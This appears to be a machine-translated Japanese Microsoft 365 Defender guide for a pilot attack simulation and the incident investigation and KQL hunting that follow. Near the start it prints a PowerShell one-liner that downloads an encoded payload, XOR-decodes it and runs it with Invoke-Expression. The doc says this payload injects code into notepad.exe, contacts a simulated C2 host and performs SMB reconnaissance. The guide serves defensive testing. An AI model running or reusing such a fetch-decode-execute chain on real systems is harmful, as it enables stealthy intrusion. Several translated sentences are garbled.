---
title: Microsoft 365 Defender 攻撃シミュレーションを実行する
description: Microsoft 365 Defender パイロット プロジェクトの攻撃シミュレーションを実行して、展開方法と迅速な修復方法を確認します。
keywords: Microsoft Threat Protection パイロット攻撃シミュレーション、Microsoft Threat Protection パイロット攻撃シミュレーションの実行、Microsoft Threat Protection の攻撃のシミュレーション、Microsoft Threat Protection パイロット プロジェクト、サイバー セキュリティ、高度な持続的脅威、エンタープライズ セキュリティ、デバイス、ID、ユーザー、データ、アプリケーション、インシデント、自動調査と修復、高度な捜問
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.openlocfilehash: bfe7358d0549a664608c396870cb2b4a5cc58edf
ms.sourcegitcommit: 222fb7fe2b26dde3d8591b61cc02113d6135012c
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 01/06/2021
ms.locfileid: "49760580"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a>Microsoft 365 Defender 攻撃シミュレーションを実行する

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|[![計画](../../media/phase-diagrams/1-planning.png)](mtp-pilot-plan.md)<br/>[計画](mtp-pilot-plan.md)|[![準備](../../media/phase-diagrams/2-prepare.png)](prepare-mtpeval.md)<br/>[準備](prepare-mtpeval.md)|![攻撃のシミュレーション](../../media/phase-diagrams/3-simluate.png)<br/>攻撃のシミュレーション|[![閉じて要約する](../../media/phase-diagrams/4-summary.png)](mtp-pilot-close.md)<br/>[閉じて要約する](mtp-pilot-close.md)|
|--|--|--|--|
|||*ここにいます。*||

現在、攻撃シミュレーション フェーズに入っている。

パイロット環境を準備した後、Microsoft 365 Defender インシデント管理と自動調査および修復機能をテストします。 高度な手法を活用して検出を隠す高度な攻撃をシミュレートするのに役立ちます。 この攻撃は、ドメイン コントローラーで開いたサーバー メッセージ ブロック (SMB) セッションを列挙し、ユーザーのデバイスの最近の IP アドレスを取得します。 通常、このカテゴリの攻撃には、被害を受けたデバイスにドロップされたファイルは含まれますが、これらはメモリ内でのみ発生します。 既存のシステムツールと管理ツールを使用して"陸上に住んでいる" ユーザーは、コードをシステム プロセスに挿入して実行を隠します。このような動作により、ユーザーは検出を回避し、デバイス上で永続化できます。

このシミュレーションでは、サンプル シナリオは PowerShell スクリプトから始まります。 ユーザーをだましてスクリプトを実行する可能性があります。 または、以前感染したデバイスから別のコンピューターへのリモート接続からスクリプトが実行される場合があります。攻撃者はネットワーク内を横方向に移動しようとした可能性があります。 管理者がリモートでスクリプトを実行してさまざまな管理アクティビティを実行する場合も多いので、これらのスクリプトの検出は困難な場合があります。

![プロセスインジェクションと SMB 再データ化攻撃によるファイルレス PowerShell 攻撃の図](../../media/mtp/mtpdiydiagram.png)

シミュレーション中に、攻撃はシェルコードを一見の高いプロセスに挿入します。 このシナリオでは、このシナリオを使用notepad.exe。 シミュレーションにこのプロセスを選択しましたが、攻撃者は、シミュレーションなどの長時間実行されるシステム プロセスsvchost.exe。 その後、シェルコードは攻撃者のコマンド アンド コントロール (C2) サーバーに接続し、続行方法に関する指示を受け取っています。 スクリプトは、ドメイン コントローラー (DC) に対する再クエリの実行を試みます。 リコンターランスにより、攻撃者は最近のユーザー ログイン情報に関する情報を取得できます。 攻撃者はこの情報を取得すると、ネットワーク内を横方向に移動して特定の機密性の高いアカウントに移動できます。

> [!IMPORTANT]
> 最適な結果を得る場合は、可能な限り攻撃シミュレーションの指示に従ってください。

## <a name="simulation-environment-requirements"></a>シミュレーション環境の要件

準備フェーズ中にパイロット環境を既に構成済みである場合は、テスト デバイスとドメイン コントローラーの 2 つのデバイスを使用してください。

1. テナントで [Microsoft 365 Defender が有効になっているか確認します](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)。

2. テスト ドメイン コントローラーの構成を確認します。

   - デバイスは、Windows Server 2008 R2以降のバージョンで実行されます。
   - Id 用に [Microsoft Defender にテスト ドメイン コントローラーを接続し](https://docs.microsoft.com/azure/security-center/security-center-wdatp) 、リモート [管理を有効にします](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)。
   - Id 用 Microsoft Defender と Microsoft Cloud App Security の統合が [有効になっている](https://docs.microsoft.com/cloud-app-security/mdi-integration) か確認します。
   - テスト ユーザーがドメインに作成されます。管理者のアクセス許可は必要はありません。

3. テスト デバイスの構成を確認します。

   1. デバイスは、Windows 10 バージョン 1903 以降のバージョンで実行されます。

   1. テスト デバイスがテスト ドメインに参加している。

   1. [[ウイルス対策] Windows Defenderオンにする](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。 ウイルス対策を有効にする際に問題Windows Defender、このトラブルシューティング トピック [を参照してください](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。

   1. テスト デバイスが Microsoft Defender for Endpoint にオンボード [済み) を確認します](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。

既存のテナントを使用してデバイス グループを実装する場合は、テスト デバイス専用のデバイス グループを作成し、構成 UX のトップ レベルにプッシュします。

## <a name="run-the-attack-scenario-simulation"></a>攻撃シナリオのシミュレーションを実行する

攻撃シナリオのシミュレーションを実行するには:

1. テスト ユーザー アカウントを使用してテスト デバイスにログインします。

2. テスト デバイスWindows PowerShellウィンドウを開きます。

3. 次のシミュレーション スクリプトをコピーします。

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > このドキュメントを Web ブラウザーで開いた場合、特定の文字を失わずにフルテキストをコピーしたり、改行を追加したりせずに、問題が発生する可能性があります。 このドキュメントをダウンロードし、Adobe Reader で開きます。

4. プロンプトで、コピーしたスクリプトを貼り付け、実行します。

> [!NOTE]
> リモート デスクトップ プロトコル (RDP) を使用して PowerShell を実行している場合は **、CTRL-V** ホットキーまたは右クリック 貼り付けメソッドが機能しない可能性があります。RDP クライアントで [クリップボード テキストの入力] コマンドを使用します。 最近のバージョンの PowerShell でもこの方法が受け入れない場合があります。最初にメモリ内のメモ帳にコピーし、仮想マシンにコピーしてから PowerShell に貼り付ける必要があります。

数秒後、notepad.exe<i> 開きます </i> 。 シミュレートされた攻撃コードが、次のコードにnotepad.exe。 完全なシナリオを体験するために、自動的に生成されたメモ帳インスタンスを開いた状態に保ちます。

シミュレートされた攻撃コードは、外部 IP アドレス (C2 サーバーをシミュレートする) との通信を試み、SMB を介してドメイン コントローラーに対する再調整を試みる。

このスクリプトが完了すると、PowerShell コンソールにメッセージが表示されます。

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

自動インシデントと対応機能の動作を確認するには、プロセスを開いたnotepad.exe保持します。 メモ帳プロセスの自動インシデントと対応の停止が表示されます。

## <a name="investigate-an-incident"></a>インシデントの調査

> [!NOTE]
> このシミュレーションの手順を説明する前に、次のビデオを見て、インシデント管理が調査プロセスの一環として関連するアラートをまとめる方法、ポータルで検索できる場所、セキュリティ操作でインシデント管理がどのように役立つのかについて説明します。

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

SOC アナリストの視点に切り替えて、Microsoft 365 セキュリティ センター ポータルで攻撃の調査を開始できます。

1. 任意の [デバイスから Microsoft 365 セキュリティ](https://security.microsoft.com/incidents) センター ポータルのインシデント キューを開きます。

2. メニューから **[インシデント** ] に移動します。

    ![Microsoft 365 セキュリティ センターの左側のメニューに表示されるインシデントのスクリーンショット](../../media/mtp/fig1.png)

3. シミュレートされた攻撃の新しいインシデントがインシデント キューに表示されます。

    ![インシデント キューのスクリーンショット](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a>1 つのインシデントとして攻撃を調査する

Microsoft 365 Defender は分析を関連付け、さまざまな製品からのすべての関連するアラートと調査を 1 つのインシデント エンティティに集約します。 これにより、Microsoft 365 Defender は広範な攻撃のストーリーを示し、SOC アナリストは複雑な脅威を理解して対応することができます。

このシミュレーション中に生成されたアラートは同じ脅威に関連付けられるので、1 つのインシデントとして自動的に集計されます。

インシデントを表示するには:

1. インシデント キュー **に移動** します。

   ![ナビゲーション メニューからのインシデントのスクリーンショット](../../media/mtp/fig1.png)

2. インシデント名の左側にある円をクリックして、最新のアイテムを選択します。 サイド パネルには、関連するアラートを含むインシデントに関する追加情報が表示されます。 各インシデントには、含まれるアラートの属性に基づいて説明する一意の名前があります。

   ![シミュレーション中に生成されたアラートが集計されるインシデント ページのスクリーンショット](../../media/mtp/fig4.png)

   ダッシュボードに表示されるアラートは、サービス リソース (Id 用 Microsoft Defender、Microsoft Cloud App Security、エンドポイント用 Microsoft Defender、Microsoft 365 Defender、および Office 365 用 Microsoft Defender) に基づいてフィルター処理できます。

3. [ **インシデントを開く] ページを** 選択して、インシデントに関する詳細を取得します。

   [インシデント **] ページ** では、インシデントに関連するアラートと情報を表示できます。 この情報には、アラートに関係するエンティティとアセット、アラートの検出ソース (Microsoft Defender for Identity、EDR)、およびリンクされた理由が含まれます。 インシデントアラートリストを確認すると、攻撃の進行状況が表示されます。 このビューでは、個々のアラートを表示して調査できます。

   右側のメニューから [ **インシデント** の管理] をクリックして、インシデントにタグを付け、自分に割り当て、コメントを追加することもできます。

   ![[インシデントの管理] をクリックする場所のスクリーンショット](../../media/mtp/fig5a.png)

   ![Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments ](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a>生成されたアラートを確認する

シミュレートされた攻撃中に生成されたアラートの一部を見てみしましょう。

> [!NOTE]
> シミュレートされた攻撃中に生成されたアラートの一部のみを確認します。 テスト デバイスで実行されている Windows のバージョンと Microsoft 365 Defender 製品によっては、表示されるアラートが少し異なる場合があります。

![生成されたアラートのスクリーンショット](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a>アラート: 疑わしいプロセスの挿入が観察されました (ソース: エンドポイント EDR 用 Microsoft Defender)

高度な攻撃者は、高度で高度な手法を使ってメモリを保持し、検出ツールを隠します。 一般的な手法の 1 つは、悪意のある実行可能ファイルではなく、信頼されたシステム プロセス内から操作し、検出ツールやセキュリティ操作で悪意のあるコードを見つけるのを難しくする方法です。

SOC アナリストがこれらの高度な攻撃をキャッチできるよう、Microsoft Defender for Endpoint のディープ メモリー センサーは、さまざまなプロセス間コードインジェクション技術をこれまでにない可視性でクラウド サービスに提供します。 次の図は、エンドポイントにコードを挿入しようとして Defender for Endpoint がどのように検出<i>され、警告notepad.exe。 </i>

![悪意のある可能性のあるコードの挿入に関する警告のスクリーンショット](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a>アラート: コマンド ライン引数を指定しないプロセスで発生した予期しない動作 (ソース: エンドポイント EDR 用 Microsoft Defender)

多くの場合、Microsoft Defender for Endpoint の検出は攻撃手法の最も一般的な属性を対象とします。 この方法では、攻撃者が新しい方法に切り替えるという信頼性が高く、高い信頼性が確保されます。

大規模な学習アルゴリズムを使用して、組織内および世界中の一般的なプロセスの通常の動作を確立し、これらのプロセスが異常な動作を示す状況を監視します。 これらの異常な動作は、多くの場合、不要なコードが導入され、信頼されていないプロセスで実行されている場合を示しています。

このシナリオでは、外部の <i> 場所notepad.exe</i> 通信を伴う異常な動作が発生しています。 この結果は、悪意のあるコードの導入と実行に使用される特定の方法とは独立しています。

> [!NOTE]
> このアラートは、追加のバックエンド処理を必要とする機械学習モデルに基づくため、ポータルでこのアラートが表示されるには時間がかかる場合があります。

アラートの詳細には、外部 IP アドレス (調査を拡張するピボットとして使用できるインジケーター) が含まれる点に注意してください。

通知プロセス ツリーで IP アドレスを選択して、IP アドレスの詳細ページを表示します。

![コマンド ライン引数を指定しないプロセスの実行による予期しない動作に関する警告のスクリーンショット](../../media/mtp/fig8.png)

次の図は、選択した IP アドレスの詳細ページを表示します (アラート プロセス ツリーで IP アドレスをクリック)。
![IP アドレスの詳細ページのスクリーンショット](../../media/mtp/fig9.png)

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>アラート: ユーザーと IP アドレスの調整 (SMB) (ソース: Id 用 Microsoft Defender)

サーバー メッセージ ブロック (SMB) プロトコルを使用した列挙により、攻撃者は、ネットワークを横方向に移動して特定の機密性の高いアカウントにアクセスするのに役立つ、最近のユーザー ログオン情報を取得できます。

この検出では、SMB セッション列挙がドメイン コントローラーに対して実行されると、アラートがトリガーされます。

![ユーザーと IP アドレスの再調整に関する Microsoft Defender for Identity アラートのスクリーンショット](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a>デバイスのタイムラインを確認する [Microsoft Defender for Endpoint]

このインシデントのさまざまなアラートを調査した後、前に調査したインシデント ページに戻ります。 インシデント ページ **の [デバイス** ] タブを選択して、このインシデントに関係するデバイスを確認します。このデバイスは、Microsoft Defender for Endpoint と Microsoft Defender for Identity によって報告されます。

攻撃が実行されたデバイスの名前を選択して、その特定のデバイスのエンティティ ページを開きます。 このページでは、トリガーされたアラートと関連するイベントを確認できます。

[ **タイムライン]** タブを選択してデバイスのタイムラインを開き、デバイスで観察されたイベントと動作を、発生したアラートと一緒に時間順に表示します。

![動作を含むデバイスのタイムラインのスクリーンショット](../../media/mtp/fig11.png)

より興味深い動作の一部を展開すると、プロセス ツリーなど、役立つ詳細が提供されます。

たとえば、疑わしいプロセスの挿入が観察されたアラート イベントが見 **られるまで下にスクロールします**。 この動作 **powershell.exe** プロセス notepad.exeに挿入されたイベントを選択して、この動作の完全なプロセス ツリーを作業ウィンドウの **[イベント** エンティティ] グラフに表示します。 必要に応じて、検索バーを使用してフィルター処理を行います。

![選択した PowerShell ファイル作成動作のプロセス ツリーのスクリーンショット](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>ユーザー情報を確認する [Microsoft Cloud App Security]

インシデント ページで 、[ユーザー  ] タブを選択し、攻撃に関与したユーザーの一覧を表示します。 この表には、各ユーザーの調査優先度スコアなど、各ユーザーに関する追加情報 **が含** まれている。

ユーザー名を選択してユーザーのプロファイル ページを開き、さらに調査を行います。 [リスクの高いユーザーの調査について詳しくは、以下を参照してください](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify)。

![Cloud App Security ユーザー ページのスクリーンショット](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a>調査と修復の自動化

> [!NOTE]
>このシミュレーションの手順を説明する前に、次のビデオを見て、自動自動修復とは何か、ポータルで検索する場所、セキュリティ操作でそれがどのように役立つのかを理解してください。

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Microsoft 365 セキュリティ センター ポータルでインシデントに戻る。 [ **インシデント] ページ** の **[調査** ] タブには、Id 用 Microsoft Defender とエンドポイント用 Microsoft Defender によってトリガーされた自動調査が表示されます。 次のスクリーンショットは、Defender for Endpoint によってトリガーされた自動調査のみを表示します。 既定では、Defender for Endpoint はキュー内で見つかったアーティファクトを自動的に修復します。修復が必要です。

![インシデントに関連する自動調査のスクリーンショット](../../media/mtp/fig14.png)

調査をトリガーしたアラートを選択して、[調査の詳細] **ページを開** きます。 次の詳細が表示されます。

- 自動調査をトリガーしたアラート。
- 影響を受け、ユーザーとデバイス。 他のデバイスでインジケーターが見つかった場合は、これらの追加のデバイスも一覧表示されます。
- 証拠のリスト。 ファイル、プロセス、サービス、ドライバー、ネットワーク アドレスなど、検出および分析されたエンティティ。 これらのエンティティは、アラートとの関係の可能性を分析し、良性または悪意のあるエンティティとして評価されます。
- 脅威が見つかりました。 調査中に検出された既知の脅威。

> [!NOTE]
> タイミングによっては、自動調査がまだ実行されている場合があります。 証拠を収集して分析し、結果を確認する前に、プロセスが完了するまで数分待ちます。 [調査の **詳細] ページを更新** して、最新の結果を取得します。

![[調査の詳細] ページのスクリーンショット](../../media/mtp/fig15.png)

自動調査の間に、Microsoft Defender for Endpoint は修復を必要とするアーティファクトの 1 つとして挿入された notepad.exe プロセスを特定しました。 エンドポイント用 Defender は、自動修復の一環として、疑わしいプロセスの挿入を自動的に停止します。

テスト デバイスで <i>notepad.exe</i> プロセスの一覧に表示されなくなる可能性があります。

## <a name="resolve-the-incident"></a>インシデントを解決する

調査が完了し、修復が確認された後、インシデントを終了します。

[インシデント **の管理] を選択します**。 状態を [インシデントの **解決] に設定し** 、関連する分類を選択します。

インシデントが解決すると、Microsoft 365 セキュリティ センターと関連するポータルで関連付けられているすべてのアラートが閉じます。

![Screenshot of the incidents page with the open Manage incident panel where you can click the switch to resolve incident](../../media/mtp/fig16.png)

これにより、インシデント管理と自動調査および修復シナリオの攻撃シミュレーションがラップされます。 次のシミュレーションでは、潜在的な悪意のあるファイルに対する予防的な脅威の検出を行います。

## <a name="advanced-hunting-scenario"></a>高度な検索シナリオ

> [!NOTE]
> シミュレーションの手順を説明する前に、次のビデオを見て高度なハンティングの概念を理解し、ポータルで検索できる場所を確認し、セキュリティ操作でそれがどのように役立つのか確認してください。

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>ハンティング環境の要件

このシナリオには、1 つの内部メールボックスとデバイスが必要です。 テスト メッセージを送信するには、外部メール アカウントも必要です。

1. テナントで Microsoft [365 Defender が有効になっているか確認します](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)。
2. 電子メールの受信に使用するターゲット メールボックスを特定します。
    a.  このメールボックスは、Microsoft Defender が 365 b Office監視する必要があります。 要件 3 のデバイスは、このメールボックスにアクセスする必要があります。
3. テスト デバイスを構成します。a. Windows 10 バージョン 1903 以降のバージョンを使用している必要があります。
    b. テスト デバイスをテスト ドメインに参加します。
    c. [[ウイルス対策] Windows Defenderオンにする](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。 ウイルス対策を有効にする際に問題Windows Defender、このトラブルシューティング [トピックを参照してください](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。
    d.  [エンドポイント用 Microsoft Defender にオンボードします](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。

### <a name="run-the-simulation"></a>シミュレーションを実行する

1. 外部電子メール アカウントから、テスト環境の要件セクションの手順 2 で識別されたメールボックスに電子メールを送信します。 既存の電子メール フィルター ポリシーで許可される添付ファイルを含める。 このファイルは、悪意のあるファイルや実行可能ファイルである必要があります。 推奨されるファイルの種類は<i>、.pdf、.exe</i>(許可されている場合)、または Word ファイルOfficeドキュメントを含むファイルです。 <i></i>
2. テスト環境の要件セクションの手順 3 で定義したデバイスから送信された電子メールを開きます。 添付ファイルを開くか、ファイルをデバイスに保存します。

#### <a name="go-hunting"></a>ハンティングを行う

1. ポータルをsecurity.microsoft.comします。

2. 高度な検索 **を>に移動します**。

   ![M365 セキュリティ センター ポータルナビゲーション バーの高度な検索のスクリーンショット](../../media/mtp/fig17.png)

3. 電子メール イベントの収集から始まるクエリを作成します。

   1. クエリ ウィンドウで、[新規] を選択します。

   1. スキーマから EmailEvents テーブルをダブルクリックします。

      ```console
      EmailEvents
      ```

   1. 時間枠を過去 24 時間に変更します。 上記のシミュレーションを実行した際に送信したメールが過去 24 時間以内だったと仮定した場合、それ以外の場合は時間枠を変更します。

      ![時間枠を変更できる場所のスクリーンショット。 ドロップダウン メニューを開いて、時間枠のオプションの範囲から選択する](../../media/mtp/fig18.png)

   1. クエリを実行します。 パイロットの環境によっては、多くの結果が得られます。

      > [!NOTE]
      > データの戻り値を制限するフィルター オプションについては、次の手順を参照してください。

      ![高度な検索クエリの結果のスクリーンショット](../../media/mtp/fig19.png)

        > [!NOTE]
        > 高度な検索では、クエリ結果が表形式データとして表示されます。 グラフなどの他の形式のデータを表示することもできます。

   1. 結果を確認し、開いたメールを識別できる場合を確認します。 高度な検索でメッセージが表示されるには、最大 2 時間かかる場合があります。 メール環境が大きく、結果が多い場合は、[フィルターの表示] オプションを使用 **してメッセージを** 検索できます。

      サンプルでは、電子メールは Yahoo アカウントから送信されました。 **+** SenderFromDomain セクションの **yahoo.com** 横にあるアイコンをクリックし、[適用]をクリックして選択したドメインをクエリに追加します。 結果をフィルター処理するには、「シミュレーションの実行」の手順 1 でテスト メッセージの送信に使用したドメインまたは電子メール アカウントを使用します。 もう一度クエリを実行して、より小さい結果セットを取得し、シミュレーションからのメッセージが表示されるのを確認します。

      ![フィルターのスクリーンショット。 フィルターを使用して検索を絞り込み、探している検索を速く見つける。](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. クエリの結果の行をクリックして、レコードを検査できます。

      ![高度な検索結果が選択された場合に開く検査レコード側パネルのスクリーンショット](../../media/mtp/fig21.png)

4. メールが表示されるのを確認したので、添付ファイルのフィルターを追加します。 環境内の添付ファイルを含むすべてのメールに焦点を当てる。 このシナリオでは、環境から送信されるメールではなく、受信メールに重点を置きます。 メッセージを見つけるために追加したフィルターを削除し、"|**AttachmentCount > 0 および** **EmailDirection**  ==  **"Inbound""**

   次のクエリは、すべての電子メール イベントに対する最初のクエリよりも短いリストを持つ結果を表示します。

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. 次に、添付ファイルに関する情報 (ファイル名、ハッシュなど) を結果セットに含める。 これを行うには **、EmailAttachmentInfo テーブルを結合** します。 参加に使用する一般的なフィールドは、 **この場合は NetworkMessageId** と **RecipientObjectId です**。

   次のクエリには、追加の行 "| も含まれています。 **project-rename EmailTimestamp=Timestamp**" は、次の手順で追加するファイル操作に関連するタイムスタンプと電子メールに関連したタイムスタンプを識別するのに役立ちます。

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. 次に **、EmailAttachmentInfo** テーブルの **SHA256** 値を使用して、そのハッシュの **DeviceFileEvents** (エンドポイントで発生したファイルアクション) を検索します。 ここで共通するフィールドは、添付ファイルの SHA256 ハッシュです。

   結果の表には、エンドポイント (Microsoft Defender for Endpoint) からの詳細 (デバイス名、実行されたアクション (この場合は FileCreated イベントのみを含むフィルター処理)、ファイルの保存場所が含まれます。 プロセスに関連付けられているアカウント名も含まれます。

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   これで、ユーザーが添付ファイルを開いた、または保存した受信メールを識別するクエリが作成されました。 このクエリを絞り込み、特定の送信者ドメイン、ファイル サイズ、ファイルの種類などについてフィルター処理することもできます。

7. 関数は特別な種類の結合であり、その普及状況、署名者や発行者情報など、ファイルに関するより多くの TI データを取得できます。ファイルの詳細を取得するには **、FileProfile()** 関数エンリッチメントを使用します。

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a>検出を作成する

今後発生した場合に警告を受け取る情報を識別するクエリを作成したら、クエリからカスタム検出を作成できます。

カスタム検出は設定した頻度に従ってクエリを実行し、クエリの結果は、選択した影響を受け取ったアセットに基づいてセキュリティの警告を作成します。 これらのアラートはインシデントに関連付け、製品の 1 つによって生成された他のセキュリティ警告としてトリアージされます。

1. クエリ ページで、検索に進む手順 7. で追加された行 7 と 8 を削除し、[検出ルールの作成] **をクリックします**。

   ![高度な検索ページで [検出ルールの作成] をクリックできる場所のスクリーンショット](../../media/mtp/fig22.png)

   > [!NOTE]
   > [検出ルール **の作成]** をクリックし、クエリに構文エラーがある場合、検出ルールは保存されません。 クエリを二重にチェックして、エラーが発生されていないことを確認します。

2. 必要なフィールドに、セキュリティ チームがアラートを理解できる情報、アラートが生成された理由、および必要なアクションを入力します。

   ![アラートの詳細を定義できる [検出ルールの作成] ページのスクリーンショット](../../media/mtp/fig23.png)

   この検出ルールの警告に関する情報に基づいた決定を次のユーザーに提供するために、フィールドに明確な情報を入力してください。

3. このアラートに影響を与えるエンティティを選択します。 この場合は、[デバイス] と [ **メールボックス]** を **選択します**。

   ![影響を受け取るエンティティのパラメーターを選択できる [検出ルールの作成] ページのスクリーンショット](../../media/mtp/fig24.png)

4. アラートがトリガーされた場合に実行するアクションを決定します。 この場合は、ウイルス対策スキャンを実行しますが、他の操作を実行できます。

   ![脅威に対処するためにアラートがトリガーされた場合にウイルス対策スキャンを実行できる [検出ルールの作成] ページのスクリーンショット](../../media/mtp/fig25.png)

5. アラート ルールのスコープを選択します。 このクエリにはデバイスが含まれるので、デバイス グループは、Microsoft Defender for Endpoint コンテキストに従ったこのカスタム検出に関連しています。 影響を受け取るエンティティとしてデバイスを含めないカスタム検出を作成する場合、スコープは適用されません。

   ![アラート ルールの範囲を設定できる [検出ルールの作成] ページのスクリーンショットは、表示される結果に対する期待を管理します。](../../media/mtp/fig26.png)

   このパイロットでは、このルールを実稼働環境のテスト デバイスのサブセットに制限できます。

6. **[作成]** を選択します。 次に、 **ナビゲーション パネルから [カスタム** 検出ルール] を選択します。

   ![メニューの [カスタム検出ルール] オプションのスクリーンショット](../../media/mtp/fig27a.png)

   ![ルールと実行の詳細を表示する [検出ルール] ページのスクリーンショット](../../media/mtp/fig27b.png)

   このページで検出ルールを選択すると、詳細ページが開きます。

   ![ルールの実行、トリガーされたアラートとアクション、検出の編集の状態を確認できる電子メールの添付ファイル ページのスクリーンショット](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a>その他の高度なハンティング のウォークスルー演習

高度な検索の詳細については、次の Web キャストを使用して、Microsoft 365 Defender 内の高度な検索機能について説明し、クロスピラー クエリの作成、エンティティへのピボット、カスタム検出と修復アクションの作成を行います。

> [!NOTE]
> パイロット テスト ラボ環境で検索クエリを実行するために、独自の GitHub アカウントを準備します。

|タイトル|説明|MP4 のダウンロード|YouTube で視聴する|使用する CSL ファイル|
|---|---|---|---|---|
|エピソード 1: KQL の基本|Microsoft 365 Defender の高度な検索機能の基本について説明します。 利用可能な高度なハンティング データと基本的な KQL 構文と演算子について説明します。|[MP4](https://aka.ms/MTP15JUL20_MP4)|[YouTube](https://youtu.be/0D9TkGjeJwM)|[エピソード 1: Git の CSL ファイル](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|エピソード 2: 参加|高度な検索のデータと、テーブルを結合する方法について、今後も学習します。 内部結合、外部結合、一意結合、および半結合、および既定の Kusto 内部一意結合のニュアンスについて説明します。|[MP4](https://aka.ms/MTP22JUL20_MP4)|[YouTube](https://youtu.be/LMrO6K5TWOU)|[エピソード 2: Git の CSL ファイル](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|エピソード 3: データの要約、ピボット、および視覚化|データのフィルター処理、操作、結合ができたので、次は、データの要約、定量化、ピボット、および視覚化を開始します。 このエピソードでは、高度な検索スキーマの追加のテーブルに入る間に実行できる集計演算子と、実行できる計算の一部について説明します。 データセットを分析の改善に役立つグラフに変換します。|[MP4](https://aka.ms/MTP29JUL20_MP4)|[YouTube](https://youtu.be/UKnk9U1NH6Y)|[エピソード 3: Git の CSL ファイル](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|エピソード 4: ハントしましょう。 KQL をインシデント追跡に適用する|攻撃者のアクティビティを追跡する時間です。 このエピソードでは、KQL と Microsoft 365 Defender の高度な検索に関する改善された理解を使用して、攻撃を追跡します。 攻撃者のアクティビティを追跡するためにこのフィールドで使用されるヒントとコツについて説明します。サイバー セキュリティの ABC や、それらをインシデント対応に適用する方法などです。|[MP4](https://aka.ms/MTP5AUG20_MP4)|[YouTube](https://youtu.be/2EUxOc_LNd8)|[エピソード 4: Git の CSL ファイル](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a>次の手順

